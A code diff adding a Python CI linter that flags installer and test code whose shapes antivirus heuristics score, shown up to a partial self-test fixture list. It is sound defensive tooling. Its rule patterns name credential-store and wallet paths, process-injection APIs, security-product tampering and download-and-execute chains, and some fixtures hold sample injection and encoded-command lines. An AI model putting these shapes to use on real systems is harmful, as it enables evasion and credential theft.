@@ -1,0 +1,978 @@
+#!/usr/bin/env python3
+# SPDX-License-Identifier: AGPL-3.0-only
+# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved.
+"""Fail CI when a change adds a code shape that heuristic scanners quarantine.
+
+Every recent false positive on this repository came from our own files, not from
+anything malicious: a test that wrote a PowerShell probe declaring a kernel32 import,
+a supply-chain scanner whose credential-path list sat next to network code, reflection
+emit in the installer, a System32 tool copied under another name, and a text file
+named .exe that a test then started. tests/studio/test_installer_av_shapes.py pins
+the shapes for the seven shipped installers; this gate carries the same idea to every
+tracked script-bearing file, so the shape is caught at review time instead of on a
+user's machine.
+
+It matches shapes, not verdicts. It cannot predict what a vendor engine decides, and
+it is not meant to: it catches the constructs those engines are known to score, says
+why, and says what to write instead.
+
+Existing sites are recorded in scripts/av_shapes_baseline.json, keyed on the matched
+line's text rather than its number, with a count, so only new occurrences fail.
+Errors in the baseline need a written reason; warnings never fail the build.
+
+    python scripts/lint_av_shapes.py              # check, exit 1 on a new error
+    python scripts/lint_av_shapes.py --update     # rewrite the baseline, keeping reasons
+    python scripts/lint_av_shapes.py --self-test  # prove every rule still fires
+    python scripts/lint_av_shapes.py --paths a.ps1 b.py   # just these files
+
+A single line can be excused with `lint-allow: AV0NN <reason>` on it or on the line
+above, except in the shipped installers, where only the baseline counts.
+
+The trigger tokens below are assembled from fragments, the same way
+scripts/scan_packages.py builds its signature strings, so this file does not itself
+carry the shapes it looks for.
+"""
+
+from __future__ import annotations
+
+import argparse
+import hashlib
+import json
+import re
+import subprocess
+import sys
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Callable
+
+REPO_ROOT = Path(__file__).resolve().parents[1]
+BASELINE_PATH = Path(__file__).resolve().parent / "av_shapes_baseline.json"
+
+SUFFIXES = (
+    ".ps1", ".psm1", ".psd1", ".bat", ".cmd", ".sh", ".py",
+    ".rs", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".yml", ".yaml",
+)  # fmt: skip
+POWERSHELL_LIKE = (".ps1", ".psm1", ".psd1", ".bat", ".cmd")
+# Where a PowerShell launch or a Windows process start can be written: not the web frontend.
+LAUNCHERS = POWERSHELL_LIKE + (".sh", ".py", ".rs", ".yml", ".yaml")
+SHIPPED_INSTALLERS = frozenset(
+    {
+        "install.ps1",
+        "install.sh",
+        "studio/setup.ps1",
+        "studio/setup.sh",
+        "studio/setup.bat",
+        "scripts/uninstall.ps1",
+        "scripts/uninstall.sh",
+    }
+)
+EXCLUDED_PARTS = frozenset({"node_modules", "vendor", "dist", "build", "__pycache__", ".git"})
+EXCLUDED_PREFIXES = ("studio/backend/assets/docs_ui/",)
+MAX_BYTES = 4_000_000  # minified bundles and generated blobs; nothing hand-written is this large
+
+_J = "".join
+
+
+def _any(*words: str) -> str:
+    return "(?:" + "|".join(words) + ")"
+
+
+# ---- trigger vocabulary, built from fragments -------------------------------------------------
+_DLLIMPORT = _J(("Dll", "Import"))
+_MEM_APIS = [
+    _J(p)
+    for p in (
+        ("Virtual", "Alloc(?:Ex)?"),
+        ("Virtual", "Protect(?:Ex)?"),
+        ("Write", "Process", "Memory"),
+        ("Create", "Remote", "Thread(?:Ex)?"),
+        ("Nt", "Create", "Thread", "Ex"),
+        ("Queue", "User", "APC"),
+        ("Set", "Windows", "Hook", "Ex[AW]?"),
+        ("Nt", "Unmap", "View", "Of", "Section"),
+    )
+]
+_EMIT = [
+    _J(p)
+    for p in (
+        ("Define", "Dynamic", "Assembly"),
+        ("Define", "PInvoke", "Method"),
+        (r"\b", "Type", "Builder", r"\b"),
+        (r"\b", "Assembly", "Builder", r"\b"),
+    )
+]
+_ENC_CMD = _J(("-Encoded", "Command"))
+_FROM_B64 = _J(("From", "Base64", "String"))
+_IEX = _any(_J(("i", "ex")), _J(("Invoke", "-Expression")))
+_DOWNLOADERS = _any(
+    _J(("i", "rm")), _J(("i", "wr")), _J(("Invoke", "-RestMethod")), _J(("Invoke", "-WebRequest")),
+    _J(("Download", "String")), _J(("New", "-Object")),
+)  # fmt: skip
+_TAMPER = [
+    _J(p)
+    for p in (
+        ("amsi", "Init", "Failed"),
+        ("Amsi", "Scan", "Buffer"),
+        ("Amsi", "Utils"),
+        # Changing a setting, not reading it, and not switching protection back on.
+        (
+            "Set",
+            "-Mp",
+            r"Preference\b[^\n]*-Disable\w*(?!\s+\$false)(?:\s+\$true|\s+1\b|\s*$|\s+`)",
+        ),
+        ("Add", "-Mp", r"Preference\b[^\n]*-Exclusion"),
+    )
+]
+_HIDDEN = _J((r"-Window", r"Style\s+", "Hidden"))
+_BYPASS = _J((r"-Execution", r"Policy\s+", "(?:By", "pass|Unre", "stricted)"))
+_BYPASS_ARRAY = _J(
+    (r"['\"]-Execution", r"Policy['\"]\s*,\s*['\"](?:By", "pass|Unre", r"stricted)['\"]")
+)
+_CRED_MARKERS = [
+    _J(p)
+    for p in (
+        ("Login", " Data"),
+        ("Local", " State"),
+        ("Web", " Data"),
+        ("wallet", r"\.dat"),
+        (r"\bElec", r"trum\b"),
+        (r"\bExo", r"dus\b"),
+        ("Meta", "Mask"),
+        (r"\bt", r"data\b"),
+        (r"\bid_", r"(?:rsa|ed25519|ecdsa)\b"),
+        ("key4", r"\.db"),
+        ("logins", r"\.json"),
+        ("Local", " Storage"),
+        (r"\.git-", "credentials"),
+        ("/etc/", "shadow"),
+        (r"\.(?:bit", "coin|ethe", "reum|sol", "ana|mon", r"ero)[/\\][A-Za-z_]{3,}"),
+        ("key", r"store[/\\]UTC--"),
+        (r"\bseed", r"\s*phrase\b"),
+        (r"\bx", r"prv\b"),
+        (r"\.aws[/\\]", "credentials"),
+        (r"\.gnu", r"pg[/\\]"),
+    )
+]
+_ENV_ACCESS = r"os\.environ|getenv\(|process\.env|\$env:|%(?:LOCAL)?APPDATA%|expanduser\("
+_NETWORK = (
+    r"\brequests\.|urllib\.request|urlopen\(|http\.client|\bhttpx\.|socket\.socket|\bfetch\("
+    r"|Invoke-WebRequest|Invoke-RestMethod|WebClient|aiohttp"
+)
+_SYSDIR = r"(?i)\b(?:System32|SysWOW64)\b"
+_COPY_CALL = (
+    r"(?i)(?<![\w.])copy(?:file|2)?\s*\(|shutil\.copy\w*\s*\(|\bCopy-Item\b"
+    r"|\[(?:System\.)?IO\.File\]::Copy\s*\(|\bCopyFileW?\s*\(|fs::copy\s*\("
+)
+_SHELL_COPY = r"(?i)^\s*(?:cp|copy)\s"
+_WRITE_CALL = r"(?:write_bytes|write_text)\((?P<args>[^\n]*)|Set-Content\b(?P<ps>[^\n]*)"
+_NON_MZ_LITERAL = r"""(?<![\w'"])b?(['"])(?!MZ)[^'"\n]{0,80}\1"""
+_STARTS_PROCESS = r"subprocess\.|Popen\(|run_pwsh\(|Start-Process\b|os\.startfile|run_step\("
+_LOLBIN = [
+    _J(p)
+    for p in (
+        (r"\bcert", r"util(?:\.exe)?\s+[^\n]*-(?:url", "cache|de", "code)"),
+        (r"\bbits", r"admin(?:\.exe)?\s+/trans", "fer"),
+        (r"\bms", r"hta(?:\.exe)?\s+(?:https?|vb", "script|java", "script):"),
+        (r"\bregsvr", r"32(?:\.exe)?\s+[^\n]*/i:\s*https?:"),
+        (r"\brun", r"dll32(?:\.exe)?\s+java", "script:"),
+    )
+]
+_PERSIST = [
+    _J(p)
+    for p in (
+        (r"\bsch", r"tasks(?:\.exe)?\s+/create"),
+        ("Register", "-Scheduled", "Task"),
+        (r"Current", r"Version\\\\?Run\b"),
+        ("shell:", "startup"),
+    )
+]
+_OBFUSCATION = [
+    r"-join\s*\[char\[\]\]",
+    r"\[char\[\]\]\s*\(\s*\d+\s*,\s*\d+",
+    r"-bxor\b",
+    r"\b[A-Za-z]+`[A-Za-z]+-[A-Za-z`]+",  # backtick-split cmdlet names
+    r"[A-Za-z0-9+/]{200,}={0,2}",  # an inline base64 blob
+]
+_VENDOR_PROSE = _any(
+    r"\banti-?virus", r"\bAMSI\b", r"\bDefender\b", _J(("Bit", "defender")), r"\bevad(?:e|ing)\b",
+    r"\bevasion\b", r"\bheuristic", r"\bquarantin", r"\bmalware\b",
+)  # fmt: skip
+
+ALLOW_RE = re.compile(r"lint-allow:\s*(AV\d{3})\s+(\S.{8,})")
+
+
+@dataclass
+class Finding:
+    rule: str
+    file: str
+    line: int
+    text: str
+    severity: str
+
+    @property
+    def digest(self) -> str:
+        return hashlib.sha256(" ".join(self.text.split()).encode()).hexdigest()[:16]
+
+
+@dataclass
+class Rule:
+    id: str
+    severity: str
+    what: str
+    why: str
+    fix: str
+    applies: Callable[[str], bool] = lambda path: True
+    line_patterns: list = field(default_factory = list)
+    check: Callable | None = None  # (path, lines, text) -> list[(line_no, severity)]
+    comments_count: bool = True  # scanners read comments too, so most rules do not skip them
+    needles: tuple = ()  # lowercase substrings; a file holding none of them cannot match, so it is not scanned
+
+
+def _is_comment(line: str) -> bool:
+    stripped = line.lstrip()
+    return stripped.startswith(("#", "//", "::", "REM ", "rem ", "<#", "*", '"""', "'''"))
+
+
+def _window(
+    lines: list[str],
+    index: int,
+    before: int,
+    after: int = 0,
+) -> list[str]:
+    return lines[max(0, index - before) : index + after + 1]
+
+
+def _check_hidden_bypass(path, lines, text):
+    hidden, bypass, array = (
+        re.compile(_HIDDEN, re.I),
+        re.compile(_BYPASS, re.I),
+        re.compile(_BYPASS_ARRAY, re.I),
+    )
+    hidden_array = re.compile(r"(?i)['\"]-WindowStyle['\"]\s*,\s*['\"]Hidden['\"]|['\"]Hidden['\"]")
+    out = []
+    for i, line in enumerate(lines):
+        if not (hidden.search(line) or hidden_array.search(line)):
+            continue
+        near = _window(lines, i, 3, 3)
+        if any(bypass.search(x) or array.search(x) for x in near):
+            out.append((i + 1, "error"))
+    return out
+
+
+def _check_credentials(path, lines, text):
+    if not re.search(_ENV_ACCESS, text) or not re.search(_NETWORK, text):
+        return []
+    markers = [re.compile(m) for m in _CRED_MARKERS]
+    present = {m.pattern for m in markers if m.search(text)}
+    if not present:
+        return []
+    severity = "error" if len(present) >= 2 else "warn"
+    out = []
+    for i, line in enumerate(lines):
+        if any(m.search(line) for m in markers):
+            out.append((i + 1, severity))
+    return out
+
+
+def _check_system_copy(path, lines, text):
+    sysdir, copy_call, shell_copy = (
+        re.compile(_SYSDIR),
+        re.compile(_COPY_CALL),
+        re.compile(_SHELL_COPY),
+    )
+    out = []
+    for i, line in enumerate(lines):
+        if _is_comment(line):
+            continue
+        is_copy = copy_call.search(line) or (
+            path.endswith((".sh", ".bat", ".cmd", ".yml", ".yaml")) and shell_copy.search(line)
+        )
+        if not is_copy:
+            continue
+        near = [x for x in _window(lines, i, 12) if not _is_comment(x)]
+        if any(sysdir.search(x) for x in near):
+            out.append((i + 1, "error"))
+    if path.endswith(".py"):
+        out.extend(_system_copy_through_a_helper(text, sysdir))
+    return sorted(set(out))
+
+
+def _system_copy_through_a_helper(text, sysdir):
+    """A System32 path handed to a function of this file that copies its argument.
+
+    The signing test did exactly this: the copy sat in a small helper and the System32
+    path only appeared at the call site, far from any copy call.
+    """
+    import ast
+
+    try:
+        tree = ast.parse(text)
+    except (SyntaxError, ValueError, RecursionError):
+        return []
+    copiers = set()
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            for call in ast.walk(node):
+                if isinstance(call, ast.Call):
+                    name = getattr(call.func, "attr", None) or getattr(call.func, "id", None) or ""
+                    if name in ("copy", "copy2", "copyfile", "copytree"):
+                        copiers.add(node.name)
+                        break
+    out = []
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Call) and getattr(node.func, "id", None) in copiers:
+            segment = ast.get_source_segment(text, node) or ""
+            if sysdir.search(segment):
+                out.append((node.lineno, "error"))
+    return out
+
+
+def _check_non_pe_exe(path, lines, text):
+    # A PowerShell test dot-sources installer functions, and those do the starting.
+    if not path.endswith(POWERSHELL_LIKE) and not re.search(_STARTS_PROCESS, text):
+        return []
+    write, literal = re.compile(_WRITE_CALL), re.compile(_NON_MZ_LITERAL)
+    out = []
+    for i, line in enumerate(lines):
+        match = write.search(line)
+        if not match:
+            continue
+        args = match.group("args") if match.group("args") is not None else match.group("ps")
+        if not literal.search(args) or re.search(r"\bb?['\"]MZ", args):
+            continue
+        if re.search(r"(?i)\.exe\b", line) or any(
+            re.search(r"(?i)\.exe['\"]", x) for x in _window(lines, i, 20)
+        ):
+            out.append((i + 1, "warn"))
+    return out
+
+
+# Our own documented one-liner is printed and quoted all over the repository; it is the user's
+# command to run, not something these files execute. Anything else piped into the engine is flagged.
+_FIRST_PARTY = re.compile(
+    r"(?i)https?://(?:(?:www\.)?unsloth\.ai|raw\.githubusercontent\.com/unslothai|github\.com/unslothai)/"
+)
+
+
+def _check_remote_exec(path, lines, text):
+    piped = re.compile(r"(?i)(https?://[^\s|'\"`]+|\)|\$[\w:]+)\s*\|\s*" + _IEX + r"\b")
+    wrapped = re.compile(r"(?i)\b" + _IEX + r"\s*\(+\s*" + _DOWNLOADERS)
+    out = []
+    for i, line in enumerate(lines):
+        hit = False
+        for match in piped.finditer(line):
+            if not (
+                match.group(1).lower().startswith("http") and _FIRST_PARTY.match(match.group(1))
+            ):
+                hit = True
+        if not hit and wrapped.search(line) and not _FIRST_PARTY.search(line):
+            hit = True
+        if hit:
+            out.append((i + 1, "error"))
+    return out
+
+
+def _check_vendor_prose(path, lines, text):
+    prose = re.compile(_VENDOR_PROSE, re.I)
+    return [
+        (i + 1, "warn") for i, line in enumerate(lines) if _is_comment(line) and prose.search(line)
+    ]
+
+
+RULES = [
+    Rule(
+        "AV001",
+        "error",
+        "declares a native Win32 import inside PowerShell / C# source (Add-Type with a native import attribute)",
+        "a script that compiles C# and binds kernel32 at run time is how loaders are built, so it is scored on sight; "
+        "a test probe with this one line was quarantined on real machines",
+        "call the API from the Python or Rust host instead, or find the PowerShell / .NET equivalent; a test that needs "
+        "the state should reach it from the harness, not from a script it writes to disk; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
+        needles = (_DLLIMPORT.lower(),),
+        line_patterns = [
+            r"\[\s*(?:System\.Runtime\.InteropServices\.)?" + _DLLIMPORT + r"(?:Attribute)?\s*\("
+        ],
+    ),
+    Rule(
+        "AV002",
+        "error",
+        "references a process-memory or thread-injection API",
+        "allocating, writing or starting code in another process is the injection pattern itself",
+        "an installer or test never needs these; remove the call; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
+        needles = tuple(
+            _J(p)
+            for p in (
+                ("virtual", "alloc"),
+                ("virtual", "protect"),
+                ("process", "memory"),
+                ("remote", "thread"),
+                ("thread", "ex"),
+                ("user", "apc"),
+                ("windows", "hook"),
+                ("unmap", "view"),
+            )
+        ),
+        line_patterns = [r"\b" + _any(*_MEM_APIS) + r"\b"],
+    ),
+    Rule(
+        "AV003",
+        "error",
+        "builds types at run time with reflection emit",
+        "emitting assemblies and P/Invoke stubs in memory is scored like compiling them; it was removed from install.ps1 "
+        "for exactly this reason",
+        "use a cmdlet or an existing .NET API; if a native call is unavoidable, make it from the Rust or Python host; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
+        needles = tuple(
+            _J(p)
+            for p in (
+                ("define", "dynamic"),
+                ("pinvoke", "method"),
+                ("type", "builder"),
+                ("assembly", "builder"),
+            )
+        ),
+        line_patterns = [_any(*_EMIT)],
+    ),
+    Rule(
+        "AV004",
+        "error",
+        "passes an encoded or base64-decoded payload to an interpreter",
+        "an encoded command hides what runs, which is the reason scanners treat it as a staged payload",
+        "pass a script file or plain -Command text; decode data only as data; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
+        needles = (_ENC_CMD.lower(), "base64", "powershell", "pwsh"),
+        applies = lambda p: p.endswith(LAUNCHERS),
+        line_patterns = [
+            r"(?i)" + _ENC_CMD + r"\b",
+            r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-e(?:c|nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{16,}",
+            _FROM_B64,
+            r"(?i)\bbase64\s+(?:-d|--decode)\b[^\n]*\|",
+        ],
+    ),
+    Rule(
+        "AV005",
+        "error",
+        "runs downloaded or string-built script text in-process",
+        "remote text piped into the expression engine is the most heavily scored PowerShell construct there is",
+        "download to a file, check a pinned digest, then run the file",
+        needles = (_J(("i", "ex")), _J(("invoke", "-expression"))),
+        check = _check_remote_exec,
+    ),
+    Rule(
+        "AV006",
+        "error",
+        "touches a security product's settings or scan interface",
+        "turning scanning off or reaching into its internals is defense evasion by definition",
+        "remove it; never alter a security product from the installer or its tests; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
+        needles = (_J(("am", "si")), _J(("mp", "preference"))),
+        line_patterns = [r"(?i)" + _any(*_TAMPER)],
+    ),
+    Rule(
+        "AV007",
+        "error",
+        "pairs a hidden window with a bypassed execution policy",
+        "that combination is the shape of a dropper launching its stage silently",
+        "keep one: RemoteSigned with a visible or CREATE_NO_WINDOW spawn is enough",
+        needles = ("hidden",),
+        applies = lambda p: p.endswith(LAUNCHERS),
+        check = _check_hidden_bypass,
+    ),
+    Rule(
+        "AV008",
+        "error",
+        "keeps browser, wallet or key-store paths in the same file as environment and network access",
+        "a file holding the paths a credential stealer reads, next to code that can reach the network, is what a "
+        "stealer looks like; scripts/scan_packages.py was flagged for this",
+        "build such strings at run time from fragments, or keep them in a data file away from network code",
+        needles = tuple(
+            _J(p)
+            for p in (
+                ("login", " data"),
+                ("local", " state"),
+                ("web", " data"),
+                ("wallet", ".dat"),
+                ("elec", "trum"),
+                ("exo", "dus"),
+                ("meta", "mask"),
+                ("t", "data"),
+                ("id_", "rsa"),
+                ("key4", ".db"),
+                ("logins", ".json"),
+                ("local", " storage"),
+                (".git-", "credentials"),
+                ("/etc/", "shadow"),
+                ("key", "store"),
+                ("seed", " phrase"),
+                ("x", "prv"),
+                (".aws", ""),
+                (".gnu", "pg"),
+                ("id_", "ed25519"),
+                ("id_", "ecdsa"),
+                (".bit", "coin"),
+                (".ethe", "reum"),
+            )
+        ),
+        check = _check_credentials,
+    ),
+    Rule(
+        "AV009",
+        "error",
+        "copies a Windows system binary",
+        "a Microsoft-signed tool renamed to something else is a classic masquerading shape",
+        "use tests/_shared/windows_console_stub.py, a pip-style launcher that runs anywhere and is not a system file",
+        needles = ("system32", "syswow64"),
+        check = _check_system_copy,
+    ),
+    Rule(
+        "AV010",
+        "warn",
+        "writes non-PE bytes to a .exe path in a file that also starts processes",
+        "if the file is ever started, Windows treats it as a DOS program and shows a modal "
+        "'Unsupported 16-Bit Application' dialog on a desktop",
+        "answer the loader's refusal without starting the file (see _windows_non_pe_is_refused_not_started in "
+        "tests/studio/install/test_keep_install_backcompat_9979.py), or use the launcher stub for a real one",
+        needles = (".exe",),
+        applies = lambda p: p.endswith(LAUNCHERS),
+        check = _check_non_pe_exe,
+    ),
+    Rule(
+        "AV011",
+        "error",
+        "uses a built-in Windows tool to fetch, decode or run a payload",
+        "these tools are the standard living-off-the-land download and execution chains",
+        "use Invoke-WebRequest or curl to a file with a digest check",
+        needles = tuple(
+            _J(p)
+            for p in (
+                ("cert", "util"),
+                ("bits", "admin"),
+                ("ms", "hta"),
+                ("regsvr", "32"),
+                ("run", "dll32"),
+            )
+        ),
+        line_patterns = [r"(?i)" + _any(*_LOLBIN)],
+    ),
+    Rule(
+        "AV012",
+        "warn",
+        "creates a scheduled task, Run key or Startup entry",
+        "silent persistence is scored even when the intent is benign",
+        "prefer a foreground, user-initiated action; keep it out of the installer",
+        needles = tuple(
+            _J(p)
+            for p in (
+                ("sch", "tasks"),
+                ("scheduled", "task"),
+                ("current", "version"),
+                ("shell:", "startup"),
+            )
+        ),
+        line_patterns = [r"(?i)" + _any(*_PERSIST)],
+    ),
+    Rule(
+        "AV013",
+        "warn",
+        "obfuscates PowerShell (char arrays, xor, backtick-split names or an inline base64 blob)",
+        "obfuscation is scored because honest code has no reason to hide what it calls",
+        "write the code plainly; ship binary data as a file, not an inline blob",
+        applies = lambda p: p.endswith(POWERSHELL_LIKE),
+        line_patterns = _OBFUSCATION,
+    ),
+    Rule(
+        "AV014",
+        "warn",
+        "a comment in a shipped installer talks about scanners or detection",
+        "the whole script, comments included, is classifier input; a scanner has quoted such a comment back as a reason "
+        "for suspicion",
+        "say what the code does in the script and keep the history in tests/studio/test_installer_av_shapes.py",
+        applies = lambda p: p in SHIPPED_INSTALLERS,
+        check = _check_vendor_prose,
+        comments_count = True,
+    ),
+    Rule(
+        "AV015",
+        "warn",
+        "builds a script block from a string, or pipes a download into a shell",
+        "string-to-code conversion is scored, more so when the text came from the network",
+        "load functions by dot-sourcing a file; download scripts to a file and verify a digest before running them",
+        needles = ("scriptblock", "curl", "wget"),
+        line_patterns = [
+            r"(?i)\[scriptblock\]::Create\s*\(",
+            r"(?i)\b(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b",
+        ],
+    ),
+]
+RULES_BY_ID = {rule.id: rule for rule in RULES}
+_COMPILED = {rule.id: [re.compile(p) for p in rule.line_patterns] for rule in RULES}
+
+
+def scan_text(relative: str, text: str) -> list[Finding]:
+    lines = text.splitlines()
+    lower = text.lower()
+    shipped = relative in SHIPPED_INSTALLERS
+    found = []
+    for rule in RULES:
+        if not rule.applies(relative):
+            continue
+        if rule.needles and not any(n in lower for n in rule.needles):
+            continue
+        hits: list[tuple[int, str]] = []
+        if rule.check is not None:
+            hits = rule.check(relative, lines, text)
+        else:
+            patterns = _COMPILED[rule.id]
+            if not any(p.search(text) for p in patterns):
+                continue
+            for i, line in enumerate(lines):
+                if any(p.search(line) for p in patterns):
+                    hits.append((i + 1, rule.severity))
+        for number, severity in hits:
+            line = lines[number - 1]
+            if not shipped:
+                allow = ALLOW_RE.search(line) or (number > 1 and ALLOW_RE.search(lines[number - 2]))
+                if allow and allow.group(1) == rule.id:
+                    continue
+            found.append(Finding(rule.id, relative, number, line.strip(), severity))
+    return found
+
+
+def _tracked_files() -> list[str]:
+    try:
+        output = subprocess.run(
+            ["git", "ls-files", "-z"], cwd = REPO_ROOT, capture_output = True, check = True
+        ).stdout
+        return [f for f in output.decode("utf-8", "replace").split("\0") if f]
+    except (OSError, subprocess.CalledProcessError):
+        return [p.relative_to(REPO_ROOT).as_posix() for p in REPO_ROOT.rglob("*") if p.is_file()]
+
+
+def _in_scope(relative: str) -> bool:
+    if not relative.endswith(SUFFIXES) or relative.endswith(".min.js"):
+        return False
+    if EXCLUDED_PARTS & set(relative.split("/")[:-1]) or relative.startswith(EXCLUDED_PREFIXES):
+        return False
+    # This gate and its test describe every shape by construction.
+    return relative not in ("scripts/lint_av_shapes.py", "tests/security/test_lint_av_shapes.py")
+
+
+def _scan_one(relative: str) -> list[Finding]:
+    path = REPO_ROOT / relative
+    if not path.is_file() or path.stat().st_size > MAX_BYTES:
+        return []
+    return scan_text(relative, path.read_text(encoding = "utf-8", errors = "replace"))
+
+
+def collect(paths: list[str] | None) -> list[Finding]:
+    if paths:
+        found = []
+        for given in paths:
+            path = Path(given) if Path(given).is_absolute() else Path.cwd() / given
+            if not path.is_file():
+                # A named file that is missing means less was checked than was asked for.
+                raise SystemExit(f"{given}: does not exist, so nothing was checked")
+            try:
+                relative = path.resolve().relative_to(REPO_ROOT).as_posix()
+            except ValueError:
+                relative = path.as_posix()
+            found.extend(scan_text(relative, path.read_text(encoding = "utf-8", errors = "replace")))
+        return found
+    candidates = [f for f in _tracked_files() if _in_scope(f)]
+    # About 6000 files and 115 MB: one process per core keeps the whole-repo run to a few seconds.
+    from concurrent.futures import ProcessPoolExecutor
+
+    with ProcessPoolExecutor() as pool:
+        results = pool.map(_scan_one, candidates, chunksize = 64)
+        return [finding for chunk in results for finding in chunk]
+
+
+def _counted(findings: list[Finding]) -> dict:
+    counts: dict = {}
+    for f in findings:
+        key = (f.file, f.rule, f.digest)
+        counts[key] = counts.get(key, 0) + 1
+    return counts
+
+
+def _load_baseline() -> dict:
+    if not BASELINE_PATH.is_file():
+        return {"_comment": "", "groups": []}
+    return json.loads(BASELINE_PATH.read_text(encoding = "utf-8"))
+
+
+def _allowed(document: dict) -> tuple[dict, dict]:
+    """Baseline groups are one reason per (file, rule) with digest -> count underneath."""
+    allowed, reasons = {}, {}
+    for group in document.get("groups", []):
+        if group.get("severity") == "error":
+            reasons[(group["file"], group["rule"])] = group.get("reason", "")
+        for digest, count in group["digests"].items():
+            allowed[(group["file"], group["rule"], digest)] = count
+    return allowed, reasons
+
+
+def _explain(f: Finding) -> str:
+    rule = RULES_BY_ID[f.rule]
+    return (
+        f"{f.file}:{f.line}: [{f.rule}] {f.severity}: {rule.what}\n"
+        f"    line: {f.text[:160]}\n"
+        f"    why:  {rule.why}\n"
+        f"    fix:  {rule.fix}\n"
+    )
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description = __doc__, formatter_class = argparse.RawDescriptionHelpFormatter
+    )
+    parser.add_argument(
+        "--update", action = "store_true", help = "rewrite the baseline, keeping reasons"
+    )
+    parser.add_argument("--self-test", action = "store_true", help = "check every rule still fires")
+    parser.add_argument(
+        "--paths", nargs = "*", help = "scan these files instead of the whole repository"
+    )
+    parser.add_argument("--json", metavar = "FILE", help = "also write the findings as JSON")
+    arguments = parser.parse_args()
+
+    if arguments.self_test:
+        return self_test()
+
+    try:
+        findings = collect(arguments.paths)
+    except (OSError, UnicodeError) as error:
+        print(f"internal error: {error}")
+        return 2
+    document = _load_baseline()
+    allowed, reasons = _allowed(document)
+    observed = _counted(findings)
+
+    if arguments.update:
+        severities = {
+            (f.file, f.rule, f.digest): f.severity for f in findings if f.severity == "error"
+        }
+        groups: dict = {}
+        for (file, rule, digest), count in sorted(observed.items()):
+            group = groups.setdefault(
+                (file, rule),
+                {"file": file, "rule": rule, "severity": "warn",
+                 "reason": reasons.get((file, rule)) or "REVIEW ME", "digests": {}},
+            )  # fmt: skip
+            group["digests"][digest] = count
+            if severities.get((file, rule, digest)) == "error":
+                group["severity"] = "error"
+        for group in groups.values():
+            # Only an error group has to be justified; a warning never fails the build.
+            if group["severity"] == "warn" and group["reason"] == "REVIEW ME":
+                group["reason"] = "pre-existing warning"
+        document["groups"] = list(groups.values())
+        BASELINE_PATH.write_text(json.dumps(document, indent = 2) + "\n", encoding = "utf-8")
+        print(f"baseline: {len(groups)} groups, {len(findings)} findings")
+        return 0
+
+    new = []
+    seen: dict = {}
+    for f in findings:
+        key = (f.file, f.rule, f.digest)
+        seen[key] = seen.get(key, 0) + 1
+        if seen[key] > allowed.get(key, 0):
+            new.append(f)
+    errors = [f for f in new if f.severity == "error"]
+    warnings = [f for f in new if f.severity == "warn"]
+
+    if arguments.json:
+        Path(arguments.json).write_text(
+            json.dumps(
+                [dict(rule = f.rule, file = f.file, line = f.line, severity = f.severity, text = f.text,
+                      what = RULES_BY_ID[f.rule].what, why = RULES_BY_ID[f.rule].why, fix = RULES_BY_ID[f.rule].fix)
+                 for f in new],
+                indent = 2,
+            ) + "\n",
+            encoding = "utf-8",
+        )  # fmt: skip
+
+    for f in warnings:
+        print(_explain(f))
+    for f in errors:
+        print(_explain(f))
+
+    problems = 0
+    if errors:
+        print(
+            f"{len(errors)} new error(s). Redesign the line as suggested. If it really has to stay, add "
+            "`lint-allow: <rule> <reason>` on or above it (not in the shipped installers), or run "
+            "`python scripts/lint_av_shapes.py --update` and write the reason into scripts/av_shapes_baseline.json."
+        )
+        problems = 1
+
+    if not arguments.paths:
+        unreviewed = sorted(
+            (file, rule)
+            for (file, rule), reason in reasons.items()
+            if not reason or reason == "REVIEW ME"
+        )
+        if unreviewed:
+            print(f"{len(unreviewed)} baseline group(s) for error rules carry no reason:")
+            for file, rule in unreviewed:
+                print(f"  {file}  {rule}")
+            problems = 1
+        stale = sorted(
+            k
+            for k in allowed
+            if k not in observed and RULES_BY_ID.get(k[1]) and RULES_BY_ID[k[1]].severity == "error"
+        )
+        if stale:
+            # An entry that outlives its line would quietly re-permit whatever lands on that digest next.
+            print(f"{len(stale)} baseline entr(y/ies) no longer match anything. Run --update:")
+            for file, rule, digest in stale:
+                print(f"  {file}  {rule}  {digest}")
+            problems = 1
+
+    if not problems:
+        print(
+            f"ok: {len(findings)} recorded finding(s), {len(warnings)} new warning(s), 0 new errors"
+        )
+    return problems
+
+
+# ---- self-test: every rule fires on its shape and stays quiet on the rewrite --------------------
+def _fixtures() -> list[tuple[str, str, str, bool]]:
+    """(rule, file name, text, should fire). Built here, in memory, never written to disk."""
+    q = '"'
+    return [
+        (
+            "AV001",
+            "t.py",
+            "probe = '''Add-Type -MemberDefinition @'\n["
+            + _DLLIMPORT
+            + "("
+            + q
+            + _J(("kernel", "32.dll"))
+            + q
+            + ")] public static extern bool "
+            + _J(("Free", "Console"))
+            + "();\n'@'''",
+            True,
+        ),
+        ("AV001", "t.py", "# the native import used to live here\nimport ctypes\n", False),
+        (
+            "AV002",
+            "t.ps1",
+            "$p = " + _J(("Virtual", "AllocEx")) + "($h, 0, 4096, 0x3000, 0x40)",
+            True,
+        ),
+        ("AV002", "t.ps1", "$p = Get-Process -Id $pid", False),
+        (
+            "AV003",
+            "install.ps1",
+            "$asm = [AppDomain]::CurrentDomain."
+            + _J(("Define", "Dynamic", "Assembly"))
+            + "($n, 'Run')",
+            True,
+        ),
+        ("AV003", "install.ps1", "$mode = Get-ConsoleMode", False),
+        ("AV004", "t.ps1", "powershell.exe " + _ENC_CMD + " ZQBjAGgAbwAgAGgAaQA=", True),
+        ("AV004", "t.ps1", "powershell.exe -NoProfile -File setup.ps1", False),
